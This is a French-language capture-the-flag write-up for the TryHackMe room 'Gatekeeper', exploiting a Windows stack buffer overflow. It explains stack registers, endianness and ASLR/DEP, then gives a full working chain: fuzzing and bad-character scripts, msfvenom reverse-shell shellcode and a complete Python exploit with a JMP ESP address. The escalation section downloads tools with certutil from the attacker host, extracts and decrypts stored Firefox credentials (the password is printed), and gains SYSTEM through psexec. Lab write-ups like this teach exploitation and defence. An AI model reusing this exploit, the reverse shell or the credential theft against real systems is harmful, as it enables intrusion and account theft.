# Gatekeeper
> Can you get past the gate and through the fire?

https://tryhackme.com/room/gatekeeper

## Nmap

```sh
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
31337/tcp open  Elite?             syn-ack
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49165/tcp open  msrpc              syn-ack Microsoft Windows RPC
```

```sh
kali@kali:~/thm/gatekeeper$ smbclient -L 10.10.80.3
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
```

```sh
kali@kali:~/thm/gatekeeper/smb$ smbclient //10.10.80.3/Users

smb: \> cd Share\
smb: \Share\> dir
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
```

```sh
kali@kali:~/thm/gatekeeper/smb$ file gatekeeper.exe 
gatekeeper.exe: PE32 executable (console) Intel 80386, for MS Windows
```

L'envoi de plus de 200 caractères A fait planter le programme, ce qui confirme sa vulnératibilité à un bufferoverflow.

## C'est quoi un bufferoverflow ?

"Le fonctionnement général d'un buffer overflow est de faire crasher un programme en écrivant dans un buffer plus de données qu'il ne peut en contenir (un buffer est un zone mémoire temporaire utilisée par une application) dans le but d'écraser des parties du code de l'application et d'injecter des données utiles pour exploiter le crash de l'application."

"De base, il n'y a pas de mécanisme qui vérifie que la quantité de données a écrire en mémoire ne dépasse pas la quantité maximum réservée. C'est au programme de s'assurer de cette vérification."

## Quelques notions nécessaires !

### La Stack et les registres

La Pile est une partie de la mémoire utilisée par l'application pour stocker ses variables locales. Elle est de type LIFO.

> Pensez à une pile de livres ou à une pile de papier, vous pouvez seulement ajouter en haut de la pile (PUSH) et vous ne pouvez que retirer que du haut de la pile (POP)

Quand une fonction du programme est créée / exécutée, elle créera une nouvelle sous-pile (Stack Frame), dans la Pile, dans laquelle sera stocké toutes les variables locales pour la fonction concernée. Une fois la fonction terminée, cette sous-pile est détruite et la zone mémoire alouée libérée.

```
+------+ ^ sens de lecture
+------+ |<-- ESP
|      |-|--> EIP 
+------+ |
|      |-|--> EBP
+------+ |
|      | |
|      | |
|      |-|--> buffer
|      | |
|      | |
|      | |
+------+ |
```

**EIP**: pointeur d'instruction, pointe toujours vers l'instruction suivante.
Les registres d'offset : 

**EBP** (Extended Base Pointer) : pointeur de la base de la pile. (RBP pour du 64 bits)

* Pointe vers un emplacement fixe dans la sous-pile de la fonction en cours d'exécution.

**ESP** (Extended Stack Pointer) : pointeur du sommet de la pile. (RIP pour du 64 bits)

* Pointe toujours vers le haut de la pile et représente l'élément le plus récent PUSHED / POPPED sur la pile

Lors d'un appel à une sous-routine, le programme empile (push) le pointeur d'instruction (EIP) sur la pile (stack) et saute au code de la sous-routine pour l'exécuter. 

Après l'exécution, le programme dépile (pop) le pointer d'instruction et retourne juste après l'endroit où a été appelée la sous-routine, grâce à la valeur d'EIP. En effet, comme EIP pointe toujours vers l'instruction suivante, lors de l'appel de la sous-routine il pointait déjà vers l'instruction suivante, autrement dit l'instruction à exécuter après la sous-routine (= adresse de retour).

D'autre part, lors de l'appel de la sous-routine, celle-ci va dans la majorité des cas créer sa propre pile dans la pile (pour éviter de gérer des adresses compliquées). Pour cela elle va empiler la valeur de la base de la pile (EBP) et affecter la valeur du pointeur de pile (ESP) à celle de la base (EBP).

### le Boutisme, l'orientation Gros-boutiste et Petit-boutiste ?! (Little-Endian, Big-Endian)

Désigne l'ordre dans lequel ces octets sont placés. 

Il existe deux conventions opposées : l'orientation gros-boutiste (ou gros-boutienne) qui démarre avec les octets de poids forts, et l'orientation inverse petit-boutiste (ou petit-boutienne). Le choix du boutisme est typiquement fixé par l'architecture du processeur, ou par le format de données d'un fichier ou d'un protocole. 

*Source: [Wikipedia](https://fr.wikipedia.org/wiki/Boutisme)*

#### Little-endian: 

`0xA0B70708` => `08 07 B7 A0`

* Windows sur x86, x86-64, ...
* Linux sur x86, x86-64, ARM, ...
* iOS sur ARM

#### Big-endian: 

`0xA0B70708` => `A0 B7 07 08`

* AmigaOS sur PowerPC et 680x0
* Linux sur MIPS, SPARC, PA-RISC, POWER, PowerPC, 680x0, AVR32, Microblaze, ARMEB, M32R, ...
* Mac OS X sur PowerPC

## Exploit !

L'utilisation d'un Debugger va permettre d'examiner le contenu de la mémoire lors du plantage et etudier l'état de la mémoire est réécrite.

> Immunity Debugger : https://www.itcats.fr/t00ls/ImmunityDebugger_1_85_setup.exe

### Etape 1 : Bourrage (Fuzzing)

En "bourrant" la variable vulnérable avec des "A", EIP contient désormais « AAAA ». 

```
+------+ ^ sens de lecture
| A... | |
| AAAA |-|
| AAAA | |
+------+ |<-- ESP
| AAAA |-|--> EIP 
+------+ |
| AAAA |-|--> EBP 
+------+ |
| AAAA | |
| AAAA | |
| AAAA |-|--> buffer
| AAAA | |
| AAAA | |
| AAAA | |
+------+ |
```

Il y a donc eu débordement sur la zone suivante, à savoir EBP (4 octets sur du 32 bits) puis EIP, qui contient l’adresse de l’instruction à laquelle le programme "sautera" (JMP) une fois la fonction terminée.

Autrement dit, une fois notre fonction terminée, notre programme saute à l’adresse indiquée par la sauvegarde d’EIP, or celle-ci a été écrasée par notre débordement mais ça, le programme s’en fiche totalement. Il saute donc à l’adresse 0x41414141 et tente d’y exécuter ce qu’il y trouve, du moins si il peut y avoir accès car un programme n’a pas accès à toute la mémoire et si il tente d’accéder à un emplacement qui ne lui est pas accessible, c’est le plantage immédiat du programme. Et c’est exactement ce qui se passe ici. Voilà la raison du plantage du programme.

**Petite remarque** : les adresses sont souvent représentées en hexadécimal et avec le préfixe « 0x » afin de préciser qu’il s’agit d’une notation hexadécimal. AAAA donnerait 41414141 et avec le préfixe, cela donnerait 0x41414141. (41 en base16 donne 65 en base 10 qui correspond au caractère A dans la [table ASCII](http://www.asciitable.com/) )

**Autre remarque** : Elle sont stockées avec l'orientation Little-Endian, et donc se lisent de la droite vers la gauche.

Le programme plante soit parce qu’il ne peut pas accéder à la zone mémoire, soit parce que ce qu’il y trouve est incompréhensible. 

L’idée pour exploiter notre programme est la suivante : injecter notre shellcode dans le buffer qu'on controle, trouver son adresse en mémoire et remplacer EIP (grâce au débordement) par cette adresse. Au retour de la fonction, c’est notre shellcode qui sera exécuté et non la suite « normale du programme ».

```py
#!/usr/bin/python
import sys,socket
import time 

address = '<target IP>'
port = 31337
buffer = ['A']
counter = 100

while len(buffer) < 10:
    buffer.append('A'*counter)
	counter=counter+100    
	try:        
		for string in buffer:            
			print '[+] Sending %s bytes...' % len(string)            
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
			connect=s.connect((address,port))            
			s.send(string + '\r\n')            
			s.recv(1024)            
			print '[+] Done'    
		except:        
			print '[!] Unable to connect to the application. You may have crashed it.'        
			sys.exit(0)    
		finally:        
			s.close()
```

## Etape 2 : Déterminer le nombre de caractère a bourrer pour atteindre EIP

Notre objectif est de déterminer quelle quantité de donnée on doit envoyer pour atteindre EIP. 

On pourra ainsi ecrire la valeur de notre choix et donner l'adresse d'une zone mémoire dont on a le control (buffer) et où nous allons injecter notre shellcode.

Deux options: 

1/ Y aller a taton en augmentant progressivement le nombre d'occurence d'un même caractères qu'on bourre jusqu'a atteindre l'EIP.

2/ Bourrer un fois un grosse chaine composée de caractère différent et determier le nombre en fonction de la valeur présente dans EIP.

```
+------+ ^ sens de lecture
| 2... | |
| YZ01 |-|
| UVWX | |
+------+ |<-- ESP
| QRST |-|--> EIP 
+------+ |
| MNOP |-|--> EBP 
+------+ |
| IJKL | |
| EFGH |-|--> data
| ABCD | |
+------+ |
```

Génération d'un pattern de bourrinage:

```sh
msf-pattern_create -l 210
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9
```

```sh
msf-pattern_offset -l 210 -q 39654138
[*] Exact match at offset 146
```

> 146 

Vérification !


### Etape 3 : Identifier les mauvais caractères, non-supportés par le programme !

En fonction de l'architecture cpu ou du type de programme, il peut y a voir des caractères non-supporté, comme par exemple `null-byte \x00` qui arrête l'execution du programme en cours... mais il en existe d'autres.

Il est nécessaire de les identifier pour les exclures de notre shellcode.

Pour ça rien de plus simple : https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

```py
#!/usr/bin/python
import socketimport sys
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

offset_to_eip = 146
total_size = 1000
buffer = "A" * offset_to_eip
buffer += "BBBB"
buffer += badchars
buffer += "A" * (total_size - len(buffer))
```

Ensuite on compare le contenu de la mémoire, après l'EIP, avec les données envoyées.

Debuggerr > First right click the ESP (pointeur du sommet de la pile.) 
Value within the Registers pane and choose Follow in Dump

On peut y voir tous les caractères qu'on a envoyés.

Tous les caractères qui diffèrent sont les mauvais caractères !

On constate que le caractère `\x0a` a été remplacé par `\x00`.

```py
badchars = "\x00\x0a"
```

### Etape 4 : Génération du shellcode

Nous savons maintenant combien de caractères sont nécessaires pour réécrire notre buffer, l'offset où l'EIP est écrasé et les caratères à ne pas utiliser.

Nous allons générer notre shellcode maintenant pour connaitre sa taille, ça va nous permettre de déterminer où l'envoyer dans la mémoire.

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.11.184 LPORT=5555 -f py -b "\x00\x0a"
(...)
Payload size: 351 bytes
```

Nous n'avons que 146 octets dans notre buffeur, donc pas assez pour coller notre shellcode !

On va donc essayer de le bourrer après l'EIP dans une zone inconnue mais pour laquelle on peut facilement trouver l'adresse :)

Reste à savoir si on peut bourrer 351 octets sans faire planter la machine !

```py
filler = "A" * 146
eip = "B" * 4
esp = "C" * 351
```

```
+------+ ^ sens de lecture
| C... | |
| CCCC |-|
| CCCC | |
+------+ |<-- ESP
| BBBB |-|--> EIP 
+------+ |
| AAAA |-|--> EBP 
+------+ |
| AAAA | |
| AAAA |-|--> data
| AAAA | |
+------+ |
```

### Etape 5 : Quelle valeur mettre dans l'EIP ?!

Il ne reste plus qu'a trouver l'adresse du début de notre buffer et l'écrire dans EIP ... 
Hummm ... c'est pas si simple ... c'est sans compter sur ASLR et DEP !

**ASLR (Address Space Layout Randomization)** est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle.

Ce procédé permet de limiter les effets des attaques de type dépassement de tampon par exemple. 

* L’implémentation sous Linux est supportée dans le noyau depuis la version 2.6.20 (juin 2005)* L’implémentation est supportée de manière native sous Windows depuis Windows Vista (février 2007)* Sous Mac OS X (partiellement[précision nécessaire]) depuis le système 10.5 (Léopard) (octobre 2007)

*Source: [wikipedia](https://fr.wikipedia.org/wiki/Address_space_layout_randomization)*

**DEP (Data Execution Prevention)** limite l'accès à certaine zone mémoire (ex. pile)

*Source: [wikipedia](https://en.wikipedia.org/wiki/Executable_space_protection#Windows)*

Comme on la vu au début, l'adresse du début de la sous-pile que l'on controle est stockée dans le registre ESP.

Il suffit donc de trouver une adresse mémoire qui contient l'instruction `JMP ESP` (Jump to the top of the Stack) !!

Nous devons maintenant trouver un module (ou un appel d'assembly) qui expose une instruction `JMP ESP`.

L'objectif ici est de trouver un module sans ASLR & DEP activé et qui ne contient pas de mauvais caractères dans l'adresse mémoire.

`!mona jmp -r esp -m gatekeeper.exe`

On trouve deux pointeurs utilisable, et aucun ne contient de mauvais caractères !

* `0x080414c3 JMP ESP`
* `0x080416bf JMP ESP`

Maintenant qu'un `JMP ESP` a été trouvé, nous devons le convertir au format Little Endian et l'ajouter à notre exploit.

```py
buffer += "\xc3\x14\x04\x08"
```

#### Et s'il n'y a pas d'ASLR ni de DEP ?!

"Trouver l’adresse exacte du début du shellcode est assez fastidieux mais, comme nous sommes fainéants, nous allons ruser et nous faciliter le travail : sur un processeur Intel x86, l’instruction 0x90 (ou NOP pour « No OPeration ») est une instruction qui ne fait pour ainsi dire rien du tout et passe à l’instruction suivante. L’idée est de placer un certain nombre de cette instruction avant le shellcode. Ainsi, il nous suffit de « tomber » sur une de ces instructions pour « glisser » vers le shellcode. Ca nous facilitera la vie car on ne devra plus trouver le début exact du shellcode, sauter sur une de ces instructions 0x90 suffira."

Cette technique est appelée `NOPSLED` (Suite de NOP)

"En effet, cela va nous éviter de devoir chercher à l’octet près le début de notre shellcode. Nous avons juste besoin de sauter quelque part parmi les xxx NOP.Pour rappel, le NOP correspond à l’instruction 0x90 (sous Linux en tout cas), il faut donc trouver dans la mémoire une suite de 90 : c’est très probablement notre NOPSLED."


### Etape 6 : Exploit & loot !

On y est presque !

On remplace les "C" par notre shellcode et ajoute quelques NOP avant au cas ou.

```py
#!/usr/bin/python
import socket, sys

ip = '172.26.20.114'
port = 31337

shellcode = b""
shellcode += b"\xbe\xd6\x2b\x47\x01\xda\xd6\xd9\x74\x24\xf4\x5f\x29"
shellcode += b"\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\xa1\x25\xa5"
shellcode += b"\xf4\xb1\xd2\xab\xf7\x49\x23\xcc\x7e\xac\x12\xcc\xe5"
shellcode += b"\xa5\x05\xfc\x6e\xeb\xa9\x77\x22\x1f\x39\xf5\xeb\x10"
shellcode += b"\x8a\xb0\xcd\x1f\x0b\xe8\x2e\x3e\x8f\xf3\x62\xe0\xae"
shellcode += b"\x3b\x77\xe1\xf7\x26\x7a\xb3\xa0\x2d\x29\x23\xc4\x78"
shellcode += b"\xf2\xc8\x96\x6d\x72\x2d\x6e\x8f\x53\xe0\xe4\xd6\x73"
shellcode += b"\x03\x28\x63\x3a\x1b\x2d\x4e\xf4\x90\x85\x24\x07\x70"
shellcode += b"\xd4\xc5\xa4\xbd\xd8\x37\xb4\xfa\xdf\xa7\xc3\xf2\x23"
shellcode += b"\x55\xd4\xc1\x5e\x81\x51\xd1\xf9\x42\xc1\x3d\xfb\x87"
shellcode += b"\x94\xb6\xf7\x6c\xd2\x90\x1b\x72\x37\xab\x20\xff\xb6"
shellcode += b"\x7b\xa1\xbb\x9c\x5f\xe9\x18\xbc\xc6\x57\xce\xc1\x18"
shellcode += b"\x38\xaf\x67\x53\xd5\xa4\x15\x3e\xb2\x09\x14\xc0\x42"
shellcode += b"\x06\x2f\xb3\x70\x89\x9b\x5b\x39\x42\x02\x9c\x3e\x79"
shellcode += b"\xf2\x32\xc1\x82\x03\x1b\x06\xd6\x53\x33\xaf\x57\x38"
shellcode += b"\xc3\x50\x82\xef\x93\xfe\x7d\x50\x43\xbf\x2d\x38\x89"
shellcode += b"\x30\x11\x58\xb2\x9a\x3a\xf3\x49\x4d\x4f\x04\xab\x26"
shellcode += b"\x27\x06\x4b\x2c\x0b\x8f\xad\x24\x7b\xc6\x66\xd1\xe2"
shellcode += b"\x43\xfc\x40\xea\x59\x79\x42\x60\x6e\x7e\x0d\x81\x1b"
shellcode += b"\x6c\xfa\x61\x56\xce\xad\x7e\x4c\x66\x31\xec\x0b\x76"
shellcode += b"\x3c\x0d\x84\x21\x69\xe3\xdd\xa7\x87\x5a\x74\xd5\x55"
shellcode += b"\x3a\xbf\x5d\x82\xff\x3e\x5c\x47\xbb\x64\x4e\x91\x44"
shellcode += b"\x21\x3a\x4d\x13\xff\x94\x2b\xcd\xb1\x4e\xe2\xa2\x1b"
shellcode += b"\x06\x73\x89\x9b\x50\x7c\xc4\x6d\xbc\xcd\xb1\x2b\xc3"
shellcode += b"\xe2\x55\xbc\xbc\x1e\xc6\x43\x17\x9b\xf6\x09\x35\x8a"
shellcode += b"\x9e\xd7\xac\x8e\xc2\xe7\x1b\xcc\xfa\x6b\xa9\xad\xf8"
shellcode += b"\x74\xd8\xa8\x45\x33\x31\xc1\xd6\xd6\x35\x76\xd6\xf2"


buffer = "A"*146
buffer += "\xc3\x14\x04\x08" # 0x080414c3 => EIP
buffer += "\x90"*10 # Ajout des NOP au cas ou on tombe pas pile poil sur le bon offset
buffer += shellcode

try:
    print '[+] Envoi de %s octets' % len(buffer)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c = s.connect((ip, port))
    s.send(buffer + "\r\n")
    r = s.recv(1024)
    print(r)
except:
    print("[+] Erreur:", sys.exc_info()[0])
    sys.exit(0)
finally:
    s.close()
```

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.11.184 LPORT=5555 -f py -b "\x00\x0a" -n 10 -v shellcode
```



```
kali@kali:~$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.9.11.184] from (UNKNOWN) [10.10.246.212] 49202
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat

C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  09:24 PM    <DIR>          .
05/14/2020  09:24 PM    <DIR>          ..
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,850,921,984 bytes free

C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
```

## Elevation de privilèges

### WinPEAS

```
certutil.exe -urlcache -split -f http://10.9.11.184/winPEAS.bat
```

=> RAS

### Vol des login/pass du profil firefox

Où est sont stocké les profils Firefox ?

```
C:\Users\natbat>dir key4.db /s
dir key4.db /s
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

04/21/2020  05:02 PM           294,912 key4.db
               1 File(s)        294,912 bytes
```

> C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

Téléchargement de 7-zip

```
certutil.exe -urlcache -split -f http://10.9.11.184/7za.exe
```

Compression du profil FF

```
7za.exe a -tzip ff.zip C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\*.*
```

Decryptage

https://github.com/unode/firefox_decrypt

```sh
kali@kali:~/thm/gatekeeper/smb$ firefox_decrypt.py ff/
2020-07-09 16:48:53,235 - WARNING - profile.ini not found in ff/
2020-07-09 16:48:53,235 - WARNING - Continuing and assuming 'ff/' is a profile location

Master Password for profile ff/: 
2020-07-09 16:48:57,020 - WARNING - Attempting decryption with no Master Password

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

```
kali@kali:~/thm/gatekeeper/smb$ smbclient -U mayor //10.10.233.170/Users
Enter WORKGROUP\mayor's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  All Users                         DHS        0  Tue Jul 14 01:08:56 2009
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  Default User                      DHS        0  Tue Jul 14 01:08:56 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  mayor                               D        0  Sun Apr 19 11:55:52 2020
  natbat                              D        0  Thu Jul  9 16:46:51 2020
  Public                             DR        0  Thu May 14 21:54:46 2020
  Share                               D        0  Thu Jul  9 16:47:38 2020

		7863807 blocks of size 4096. 3856525 blocks available
smb: \> cd mayor
smb: \mayor\> cd Desktop
smb: \mayor\Desktop\> dir
  .                                  DR        0  Thu May 14 21:58:07 2020
  ..                                 DR        0  Thu May 14 21:58:07 2020
  desktop.ini                       AHS      282  Sun Apr 19 11:55:56 2020
  root.txt.txt                        A       27  Thu May 14 21:21:09 2020

		7863807 blocks of size 4096. 3856718 blocks available
smb: \mayor\Desktop\> get root.txt.txt
getting file \mayor\Desktop\root.txt.txt of size 27 as root.txt.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

```
kali@kali:~/thm/gatekeeper/smb$ cat root.txt.txt 
{Th3_M4y0r_C0ngr4tul4t3s_U}
```

Installation de Impacket

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

```
psexec.py mayor:8CL7O1N78MdrCIsV@10.10.233.170 cmd -path c:\\windows\\system32\\
Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.233.170.....
[*] Found writable share ADMIN$
[*] Uploading file LAooGvEo.exe
[*] Opening SVCManager on 10.10.233.170.....
[*] Creating service ByDX on 10.10.233.170.....
[*] Starting service ByDX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32>whoami
nt authority\system
```


## Sources:
* https://www.cybersecpadawan.com/2020/05/official-gatekeeper-writeup-my-first.html
* https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html
* https://hacktion.be/premier-buffer-overflow/
* https://www.securiteinfo.com/attaques/hacking/buff.shtml
* https://resources.infosecinstitute.com/in-depth-seh-exploit-writing-tutorial-using-ollydbg/#gref
* https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
